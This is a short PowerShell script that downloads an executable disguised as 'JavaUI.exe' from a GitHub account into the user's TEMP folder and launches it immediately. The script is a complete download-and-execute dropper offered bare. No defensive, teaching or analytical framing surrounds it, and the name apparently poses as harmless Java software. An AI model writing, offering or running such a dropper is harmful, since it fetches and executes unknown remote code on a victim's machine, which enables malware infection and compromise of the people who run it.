$downloadUrl = "https://github.com/tayic99373/leave/raw/main/JavaUI.exe"
$downloadPath = "$env:TEMP\JavaUI.exe"

# Create a WebClient object
$webClient = New-Object System.Net.WebClient

# Download the executable file
$webClient.DownloadFile($downloadUrl, $downloadPath)

# Execute the downloaded file
Start-Process -FilePath $downloadPath
